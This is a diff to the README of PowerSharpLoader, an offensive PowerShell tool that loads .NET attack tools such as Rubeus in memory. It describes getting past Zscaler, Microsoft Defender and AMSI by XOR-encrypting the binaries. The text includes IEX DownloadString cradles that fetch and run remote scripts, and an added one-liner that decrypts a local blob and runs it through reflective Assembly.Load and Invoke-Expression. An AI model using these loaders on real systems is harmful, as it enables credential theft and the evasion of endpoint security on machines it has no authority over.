@@ -148,6 +148,8 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/
 ## [Update] Zscaler Bypass
 In some cases that the AV/EDR (such as Zscaler) will detect and block the download of the known malicious tools (such as Rubeus.exe), this will break the workflow of Invoke-Assembly.ps1. One way to bypass this is to base64 the binary and encrypt it (in this case, using XOR since it's simple and works), then download and load the encrypted payload using the new `Invoke-AssemblyXOR.ps1` to load the tool. AMSI bypass is required to bypass MDE and might other AV/EDR, howerver, some EDR like CS Falcon will be able to detect it when the tool is running and kill it in seconds. This will need to be addressed in other ways.
 
+Thanks to [**Gabe Marshall**](https://gist.github.com/gabemarshall), I borrowed his XOR PowerShell script which is nice and simple (The code is here: https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7).
+
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
 Invoke-LoadAssemblyXOR -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/rubeusxorb64.txt -KeyString "enc_password_here" -Command "hash /password:test"
@@ -225,4 +227,21 @@ PS C:\Users\pentester>
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXORLocal.ps1"));
 Invoke-LoadAssemblyXOR -AssemblyPath "C:\\Windows\\Tasks\\rubeusxorb64meow.txt" -KeyString "enc_password_here" -Command "hash /password:test"
 
+```
+Or using the oneliners:
+
+```
+$enc = [System.Text.Encoding]::UTF8;
+function xor { param($string, $method, $key); $xorkey = $enc.GetBytes($key); if ($method -eq "decrypt"){ $string = $enc.GetString([System.Convert]::FromBase64String($string))}; $byteString = $enc.GetBytes($string); $xordData = $(for ($i = 0; $i -lt $byteString.length;){ for ($j = 0; $j -lt $xorkey.length; $j++){$byteString[$i] -bxor $xorkey[$j]; $i++; if ($i -ge $byteString.Length) { $j = $xorkey.length }}}); if ($method -eq "encrypt") { $xordData = [System.Convert]::ToBase64String($xordData)} else { $xordData = $enc.GetString($xordData)}; return $xordData;}
+
+$Command = ""
+$KeyString = "<xor_password_here>"
+$AssemblyPath = "C:\\Windows\\Tasks\\dn0wrubhashxorb64.txt"
+$xorb64_bin = (Get-Content -Path $AssemblyPath)
+[Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $KeyString))
+$assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
+$ep = $assembly.EntryPoint
+$ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
+echo $ldrcommand
+Invoke-Expression $ldrcommand
 ```
